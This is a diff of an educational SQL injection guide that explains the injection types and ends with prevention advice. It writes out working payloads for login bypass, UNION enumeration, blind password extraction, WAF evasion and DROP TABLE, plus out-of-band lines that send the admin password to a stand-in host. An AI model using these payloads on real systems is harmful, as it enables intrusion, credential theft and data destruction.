@@ -52,9 +52,6 @@ Occurs when the application reflects error messages or results. It's easy to det
 
 Example:
 
-plaintext
-Copy
-Edit
 Username: ' OR 1=1 --
 Password: [blank]
 System thinks 1=1 is always true, so it logs you in.
@@ -63,32 +60,22 @@ System thinks 1=1 is always true, so it logs you in.
 When the app doesn't show errors, but you can detect behavior changes. There are 2 types:
 
 a. Boolean-based
-plaintext
-Copy
-Edit
+
 ' AND 1=1--   → Valid page  
 ' AND 1=2--   → Error or blank page
 Example:
 Sam tries:
 
-plaintext
-Copy
-Edit
+
 ' AND 1=1 --    ✅ Sandwich found  
 ' AND 1=2 --    ❌ Sandwich not found
 b. Time-based
-plaintext
-Copy
-Edit
+
 ' OR SLEEP(5)--
 If the page delays, it's vulnerable.
 
 Example:
-Alle injects:
 
-sql
-Copy
-Edit
 '; IF(1=1, SLEEP(5), 0) --
 If the blog takes 5 seconds to load — it’s vulnerable.
 
@@ -97,16 +84,10 @@ Used when you can't detect response or timing differences. You trigger DNS or HT
 
 Payload:
 
-sql
-Copy
-Edit
 '; exec master..xp_dirtree '//your-subdomain.burpcollaborator.net/a'--
 Example:
 Using:
 
-sql
-Copy
-Edit
 '; exec xp_dirtree '\\bughunter.oast.live\share'--
 You get a DNS request on your listener — confirms vulnerability.
 
@@ -116,15 +97,9 @@ You inject a payload that gets stored and is later used in a vulnerable SQL quer
 Example:
 Sign up with:
 
-plaintext
-Copy
-Edit
 Name = admin'--
 Later, query becomes:
 
-sql
-Copy
-Edit
 SELECT * FROM users WHERE username = 'admin'--'
 It shows admin's data instead of yours.
 
@@ -140,11 +115,7 @@ JSON payloads
 XML requests
 
 Example:
-XML:
 
-xml
-Copy
-Edit
 <storeId>
     999 &#x53;ELECT * FROM users
 </storeId>
@@ -155,132 +126,88 @@ Here, &#x53; = "S", bypassing WAFs.
 a. Login Bypass (Authentication bypass)
 Normal query:
 
-sql
-Copy
-Edit
 SELECT * FROM users WHERE username = 'ananya' AND password = '123456';
 Injection:
 
-plaintext
-Copy
-Edit
 Username: ' OR '1'='1
 Password: [any]
 Becomes:
 
-sql
-Copy
-Edit
 SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '[anything]';
+
 b. Error-Based SQL Injection
-sql
-Copy
-Edit
+
 ' AND 1=CAST((SELECT @@version) AS INT)--
 Forces error → leaks DB version.
 
 c. UNION-Based SQL Injection
 Normal query:
 
-sql
-Copy
-Edit
 SELECT name, description FROM products WHERE category = 'Gifts';
 Payload:
 
-sql
-Copy
-Edit
 ' UNION SELECT NULL, username FROM users--
 Shows usernames.
 
 Find column count:
 
-sql
-Copy
-Edit
 ' ORDER BY 1--  
 ' ORDER BY 2--  
 ' ORDER BY 3--  
 Test column reflection:
 
-sql
-Copy
-Edit
 ' UNION SELECT NULL, 'test'--
 Info schema discovery:
 
-sql
-Copy
-Edit
 ' UNION SELECT NULL, table_name FROM information_schema.tables--
 
 ' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name = 'users'--
 
 ' UNION SELECT NULL, username FROM users--
+
 d. WAF Bypass & Obfuscation
 Techniques:
 
 Inline Comments
 
-sql
-Copy
-Edit
 '/**/OR/**/1=1-- 
 Changing Case
 
-sql
-Copy
-Edit
+
 oR 1=1
 URL Encoding
 
-plaintext
-Copy
-Edit
+
 %27%20OR%201=1--  
 String Concatenation
 
-sql
-Copy
-Edit
+
 CHAR(97)+CHAR(100)+CHAR(109)+CHAR(105)+CHAR(110) -- 'admin'
 Hex Encoding
 
-sql
-Copy
-Edit
+
 username = 0x61646d696e
 Whitespace Bypass
 
-sql
-Copy
-Edit
+
 S/**/E/**/L/**/E/**/C/**/T
+
 2. Blind SQL Injection
 a. Boolean-Based Blind SQLi
-sql
-Copy
-Edit
+
 ' AND 1=1--     → True  
 ' AND 1=2--     → False
 Extract character by character:
 
-sql
-Copy
-Edit
+
 ' AND SUBSTRING((SELECT username FROM users WHERE role='admin'),1,1)='a'--
 b. Time-Based Blind SQLi
-sql
-Copy
-Edit
+
 ' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a', SLEEP(5), 0)--
 If it pauses — char is correct.
 
 c. Out-of-Band (OAST) Blind SQLi
-sql
-Copy
-Edit
+
 '; declare @p varchar(1024); 
    set @p=(SELECT password FROM users WHERE username='admin'); 
    exec('master..xp_dirtree "//'+@p+'.yourdomain.net/a"')-- 
@@ -289,33 +216,29 @@ DNS request confirms it.
 3. Second-Order SQL Injection
 Payload stored in profile:
 
-plaintext
-Copy
-Edit
+
 qwert'; DROP TABLE users;--
 Later used in a query:
 
-sql
-Copy
-Edit
+
 SELECT * FROM logs WHERE username = 'qwert'; DROP TABLE users;--';
+
 The users table is dropped.
 
 🔐 How to Prevent SQL Injection
+
 a. Use parameterized queries (prepared statements)
 Unsafe:
 
-python
-Copy
-Edit
+
 query = "SELECT * FROM users WHERE username = '" + user_input + "'"
 Safe:
 
-python
-Copy
-Edit
+
 cursor.execute("SELECT * FROM users WHERE username = %s", (user_input,))
+
 b. Validate and Sanitize Input
+
 Use whitelisting (only allow expected values).
 
 Avoid blacklisting.
@@ -323,6 +246,7 @@ Avoid blacklisting.
 Reject characters like ', ;, -- if not needed.
 
 c. Limit Database Privileges
+
 Use least privilege.
 
 Login form? Only need SELECT.
@@ -330,11 +254,13 @@ Login form? Only need SELECT.
 Never allow DROP, ALTER, or ADMIN actions.
 
 d. Use Web Application Firewall (WAF)
+
 Helps detect/block known payloads.
 
 But don’t rely solely on it.
 
 e. Log, Monitor, and Alert
+
 Monitor for anomalies like repeated login bypass attempts or delayed responses.
 
 Use SIEMs for alerts.
